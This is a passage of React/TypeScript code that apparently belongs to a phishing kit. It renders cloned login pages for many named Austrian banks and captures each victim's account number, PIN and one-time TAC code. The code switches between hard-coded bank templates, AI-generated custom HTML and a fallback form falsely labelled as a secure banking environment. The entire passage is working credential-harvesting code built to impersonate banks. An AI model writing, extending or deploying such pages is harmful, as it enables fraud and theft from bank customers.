    if (bankSlug === "bank99") return <Bank99 formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "btv") return <BtvVierLanderBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "bks-bank") return <BksBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "oberbank") return <Oberbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-noe") return <HypoNoe formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-tirol") return <HypoTirol formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-vorarlberg") return <HypoVorarlberg formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-burgenland") return <HypoBurgenland formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "hypo-ooe") return <HypoOberosterreich formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "aerztebank") return <AerzteApothekerBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "spaengler") return <BankhausSpangler formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "schelhammer") return <SchelhammerCapital formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "easybank") return <Easybank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "schoellerbank-ag" || bankSlug === "schoellerbank") return <Schoellerbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "sparda-bank") return <SpardaBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "vkb") return <Volkskreditbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "anadi-bank") return <AnadiBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "marchfelder") return <MarchfelderBank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
    if (bankSlug === "dolomitenbank") return <Dolomitenbank formData={{ verfuegernummer, pin }} onChange={handleTemplateChange} handleRouteAction={handleTemplateSubmit} saving={saving} />;
  }

  // YENİ DİNAMİK YAPISAL ŞEMA VARSA ONU KULLAN
  if (bank.design && (bank.design.visualTree || bank.design.customHtml || (bank.design.blocks && bank.design.blocks.length > 0))) {
    const design = bank.design;

    if (design.visualTree && !design.customHtml) {
      const renderVisualTree = (element: any): React.ReactNode => {
        const Tag = element.type === "container" ? "div" :
                    element.type === "text" ? "span" :
                    element.type === "form" ? "form" :
                    element.type === "button" ? "button" :
                    element.type === "image" ? "img" :
                    element.type === "input" ? "input" : "div";

        const props: any = {
          key: element.id,
          style: element.styles,
          ...element.attributes,
        };

        if (element.type === "image") {
          Object.assign(props, getRenderableImageProps(element, bank.logoFile, bank.name));
        }

        if (element.type === "input") {
          const fieldName = props.name;
          if (!isAllowedBankInputName(fieldName)) {
            return null;
          }
          if (fieldName === "verfuegernummer") {
            props.value = verfuegernummer;
            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setVerfuegernummer(e.target.value);
            props.required = true;
          } else if (fieldName === "pin") {
            props.type = "password";
            props.value = pin;
            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setPin(e.target.value);
            props.required = true;
          } else if (fieldName === "tacCode") {
            props.value = tacCode;
            props.onChange = (e: React.ChangeEvent<HTMLInputElement>) => setTacCode(e.target.value);
          }
        }

        if (element.type === "button") {
          props.disabled = saving || props.disabled;
          if (props.type === "submit") {
            props.style = {
              ...props.style,
              opacity: saving ? 0.7 : props.style?.opacity,
              cursor: saving ? "not-allowed" : props.style?.cursor,
            };
          }
        }

        if (element.type === "form") {
          props.onSubmit = handleSubmit;
        }

        if (element.type === "input" || element.type === "image") {
          return <Tag {...props} />;
        }

        return (
          <Tag {...props}>
            {element.content}
            {element.children?.map(renderVisualTree)}
          </Tag>
        );
      };

      return (
        <div className="min-h-screen w-full font-sans antialiased">
          {error ? <div style={{ color: "#ef4444", fontSize: "14px", margin: "1rem auto 0", maxWidth: "960px", textAlign: "center", backgroundColor: "#fee2e2", padding: "0.75rem", borderRadius: "8px" }}>{error}</div> : null}
          {renderVisualTree(design.visualTree)}
        </div>
      );
    }
    
    // Eğer AI tamamen özel HTML/React Component şablonu oluşturmuşsa
    if (design.customHtml) {
      const cleanHtml = normalizeBankCustomHtml(design.customHtml);

      const options = {
        replace: (domNode: any) => {
          if (domNode instanceof Element) {
            if (domNode.name === "input") {
              const inputName = domNode.attribs?.name;
              if (!isAllowedBankInputName(inputName)) {
                return null;
              }
            }
            if (domNode.name === "input" && domNode.attribs?.name === "verfuegernummer") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} value={verfuegernummer} onChange={(e) => setVerfuegernummer(e.target.value)} required />;
            }
            if (domNode.name === "input" && domNode.attribs?.name === "pin") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} type="password" value={pin} onChange={(e) => setPin(e.target.value)} required />;
            }
            if (domNode.name === "input" && domNode.attribs?.name === "tacCode") {
              const props = attributesToProps(domNode.attribs);
              return <input {...props} value={tacCode} onChange={(e) => setTacCode(e.target.value)} />;
            }
            if (domNode.name === "button" && domNode.attribs?.type === "submit") {
              const props = attributesToProps(domNode.attribs);
              return (
                <button {...props} disabled={saving} style={{ ...props.style, opacity: saving ? 0.7 : 1, cursor: saving ? 'not-allowed' : 'pointer' }}>
                  {saving ? "Laden..." : domToReact(domNode.children as any, options)}
                </button>
              );
            }
            if (domNode.name === "form") {
              const props = attributesToProps(domNode.attribs);
              return (
                <form {...props} onSubmit={handleSubmit}>
                  {error && <div style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem', textAlign: 'center', backgroundColor: '#fee2e2', padding: '0.5rem', borderRadius: '4px' }}>{error}</div>}
                  {domToReact(domNode.children as any, options)}
                </form>
              );
            }
            // Logo yer tutucusunu (<img> src) bankanın gerçek logosuyla değiştir
            if (domNode.name === "img" && domNode.attribs?.src && domNode.attribs.src.includes("placeholder")) {
              if (bank.logoFile) {
                const props = attributesToProps(domNode.attribs);
                return <img {...props} src={bank.logoFile} alt={bank.name} style={{ ...(props.style ?? {}), maxWidth: "100%", maxHeight: "100%", objectFit: "contain", objectPosition: "left center", display: "block" }} />;
              }
            }
          }
        }
      };
      
      return (
        <div className="min-h-screen w-full font-sans antialiased">
          {parse(cleanHtml, options)}
        </div>
      );
    }

    const renderBlock = (block: BlockType, index: number) => {
      switch (block) {
        case "header":
          if (!design.header.show) return null;
          return (
            <header 
              key="header"
              style={{ 
                backgroundColor: design.header.backgroundColor, 
                height: design.header.height,
                padding: design.header.padding,
                display: 'flex',
                alignItems: 'center',
                justifyContent: design.header.logoAlignment === 'center' ? 'center' : design.header.logoAlignment === 'right' ? 'flex-end' : 'flex-start'
              }}
            >
              {bank.logoFile ? (
                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '100%', maxWidth: '200px', objectFit: 'contain' }} />
              ) : (
                <div style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor }}>{bank.logo}</div>
              )}
            </header>
          );
        
        case "form":
          return (
            <div key="form" style={{ display: 'flex', justifyContent: design.formBox.alignment === 'center' ? 'center' : design.formBox.alignment === 'right' ? 'flex-end' : 'flex-start', padding: '2rem' }}>
              <div 
                style={{
                  backgroundColor: design.formBox.backgroundColor,
                  color: design.formBox.textColor,
                  borderRadius: design.formBox.borderRadius,
                  boxShadow: design.formBox.boxShadow !== 'none' ? '0 10px 25px -5px rgba(0, 0, 0, 0.1)' : 'none',
                  padding: design.formBox.padding,
                  width: design.formBox.width,
                  maxWidth: '100%',
                  fontFamily: design.typography.fontFamily
                }}
              >
                <h2 style={{ fontSize: '24px', fontWeight: 'bold', color: design.typography.headerColor, marginBottom: '0.5rem' }}>{design.texts.title}</h2>
                <p style={{ fontSize: '15px', color: design.typography.bodyColor, marginBottom: '2rem' }}>{design.texts.subtitle}</p>
                
                <form onSubmit={handleSubmit}>
                  <div style={{ marginBottom: '1rem' }}>
                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Gebruikersnaam</label>
                    <input required value={verfuegernummer} onChange={e => setVerfuegernummer(e.target.value)} type="text" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw gebruikersnaam" />
                  </div>
                  <div style={{ marginBottom: '1.5rem' }}>
                    <label style={{ display: 'block', fontSize: '14px', fontWeight: 'bold', marginBottom: '0.5rem' }}>Wachtwoord</label>
                    <input required value={pin} onChange={e => setPin(e.target.value)} type="password" style={{ width: '100%', padding: '0.75rem', border: '1px solid #ccc', borderRadius: '4px', outline: 'none' }} placeholder="Uw wachtwoord" />
                  </div>
                  
                  {error && <p style={{ color: '#ef4444', fontSize: '14px', marginBottom: '1rem' }}>{error}</p>}
                  
                  <button 
                    type="submit"
                    disabled={saving}
                    style={{
                      width: '100%',
                      backgroundColor: design.button.backgroundColor,
                      color: design.button.textColor,
                      padding: design.button.padding,
                      borderRadius: design.button.borderRadius,
                      fontWeight: design.button.fontWeight as any,
                      border: 'none',
                      cursor: saving ? 'not-allowed' : 'pointer',
                      opacity: saving ? 0.7 : 1
                    }}
                  >
                    {saving ? "Laden..." : design.texts.title}
                  </button>
                </form>
              </div>
            </div>
          );
  
        case "footer":
          return (
            <footer key="footer" style={{ padding: '2rem', textAlign: 'center', marginTop: 'auto' }}>
              <div style={{ display: 'flex', justifyContent: 'center', gap: '2rem', flexWrap: 'wrap' }}>
                {design.texts.footerLinks.map((link: string, i: number) => (
                  <a key={i} href="#" style={{ color: design.typography.linkColor, fontSize: '14px', textDecoration: 'none' }}>{link}</a>
                ))}
              </div>
            </footer>
          );
  
        case "spacer":
          return <div key={`spacer-${index}`} style={{ flexGrow: 1, minHeight: '2rem' }}></div>;
          
        default:
          return null;
      }
    };
  
    return (
      <div 
        style={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          backgroundColor: design.background.type === 'color' ? design.background.value : 'transparent',
          backgroundImage: design.background.type === 'image' ? `url(${design.background.value})` : 'none',
          backgroundSize: 'cover',
          backgroundPosition: 'center',
          fontFamily: design.typography.fontFamily
        }}
      >
        {design.blocks.map((block: BlockType, index: number) => renderBlock(block, index))}
      </div>
    );
  }

  // ESKİ FALLBACK TASARIM (Dinamik şema yoksa çalışır)
  if (!theme) {
    return (
      <div className="flex min-h-screen items-center justify-center p-4">
        <div className="flex justify-center py-16">
          <div className="size-12 animate-spin rounded-full border-4 border-zinc-300 border-t-zinc-600" />
        </div>
      </div>
    );
  }

  const primaryColor = bank.brandColor || theme.colors.primary;
  const secondaryColor = bank.accentColor || theme.colors.secondary;
  const logoText = bank.logo || theme.logoText;

  return (
    <div className="flex min-h-screen items-center justify-center p-4 bg-gray-50">
      <div className="app-panel overflow-hidden rounded-2xl w-full max-w-md shadow-xl border border-gray-100 bg-white">
        <div
          className="flex items-center justify-between px-5 py-4 text-white"
          style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
        >
          <div className="flex items-center gap-3">
            <div
              className="grid h-10 min-w-10 place-items-center rounded-md px-2 text-xs font-bold tracking-wide bg-white/20"
              style={{ color: theme.colors.textOnPrimary }}
            >
              {bank.logoFile ? (
                <img src={bank.logoFile} alt={bank.name} style={{ maxHeight: '24px', objectFit: 'contain' }} />
              ) : (
                logoText
              )}
            </div>
            <div>
              <p className="text-[10px] uppercase tracking-widest opacity-80">Veilige Bankomgeving</p>
              <h2 className="text-lg font-bold">{bank.name}</h2>
            </div>
          </div>
        </div>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            void handleSubmit();
          }}
          className="space-y-5 p-6"
        >
          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.verfuegernummer}
            <input
              required
              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
              value={verfuegernummer}
              onChange={(e) => setVerfuegernummer(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.pin}
            <input
              required
              type="password"
              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all"
              value={pin}
              onChange={(e) => setPin(e.target.value)}
            />
          </label>

          <label className="block text-sm font-bold text-zinc-800">
            {theme.inputLabels.tacCode}
            <input
              required
              inputMode="numeric"
              maxLength={6}
              className="mt-2 block w-full rounded-xl border border-gray-200 bg-gray-50 py-3 px-4 text-lg shadow-sm focus:border-blue-500 focus:ring-2 focus:ring-blue-500/20 outline-none transition-all tracking-widest"
              value={tacCode}
              onChange={(e) => setTacCode(e.target.value.replace(/\D/g, "").slice(0, 6))}
            />
          </label>

          {error ? <p className="text-sm font-medium text-red-600">{error}</p> : null}

          <button
            type="submit"
            disabled={saving}
            className="w-full rounded-xl py-4 text-lg font-bold shadow-md transition-all hover:brightness-110 active:scale-[0.98] disabled:opacity-60"
            style={{ backgroundColor: primaryColor, color: theme.colors.textOnPrimary }}
          >
            {saving ? "Controleren..." : theme.buttonText}
          </button>
        </form>
      </div>
    </div>
  );
}
